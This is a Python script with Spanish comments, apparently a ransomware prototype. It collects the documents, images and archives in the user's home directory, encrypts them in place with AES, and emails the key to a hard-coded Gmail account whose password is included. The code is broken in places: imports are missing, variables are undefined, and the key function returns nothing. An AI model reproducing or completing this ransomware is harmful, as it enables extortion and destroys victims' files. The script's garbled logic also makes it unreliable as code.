
¡import os
import random
import hashlib
from Crypto.Util import Counter
from Crypto.Cipher import AES
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

#Creamos variable para listar directorios de la computadora
inicio = os.environ['HOME']
direc = os.listdir(inicio)
# Variable para tipo de extension
ex = ['.pdf','.txt','.jpg','.jpeg','.mp3','.mp4','.png','.zip','.docx']

def encriptar(archivo,encrip):
    with open(archivo,'r+b') as encriptado:
        cifrar = encriptado.read(bloque)
        while cifrar:
            cifrado = encrip(cifrar)
            encriptado.seek(- len(cifrar),1)
            encriptado.write(cifrado)
            cifrar = encriptado.read(bloque)
#Funcion para generar una clave en md5
def clave():
    clave1 = os.environ['USER'] + str(random.randint(0,100000))
    clave1 = hashlib.md5()
    clave1 = clave1.hexdigest()

def correo():
    mensaje = MIMEMultipart()
    contra = 'todoprueba21'
    mensaje['From']= 'pruebastodo21@gmail.com'
    mensaje['To']= 'pruebastodo21@gmail.com'
    mensaje['Subject']= 'clave para descifrar los archivos'
    
    mensaje.attach(MIMEText(key,'html'))
    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(mensaje['From'], contra)
        
    except:
        pass
#Definimos las rutas de los directorios
def directorio(key):
    
    lista = open('lista','w+')
    for direciones in direc:
        ruta = inicio+'/'+direciones
        for exten in ex:
          if archivo.endswith(exten):
            lista.write(os.path.join(dir,archivo)+'\n')
    lista.close()

    list = open('lista','r')
    list = list.read().split('\n')
    
    list = [l for l in list if not l == ""]
    
    if os.path.exists('clave'):
        lav = input('Inserte llave:')
        llave1 = open('clave','r')
        llav = llave1.read().split('\n')
        llav = ''.join(llav)
        if llav1 == llav:
            c = Counter.new(128)
            crypto = AES.new(llav,AES.MODE_CTR, counter=c)
            cryparchives = crypto.decrypt
            for element in list:
                encriptar(element,cryparchives)
    else:
        c = Counter.new(128)
        crypto = AES.new(llav,AES.MODE_CTR, counter=c)
        llave1 = open('clave','w+')
        llave1.write(llav)
        llave1.close()
        server.sendmail(mensaje['From'],mensaje['To'],mensaje.as_string())
        server.quit()
        cryparchives = crypto.encrypt
       

#Definimos la funcion principal
def main():
#Llamamos a la funcion internet
    
    clave1 = clave()
    
    directorio(clave1)
  
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()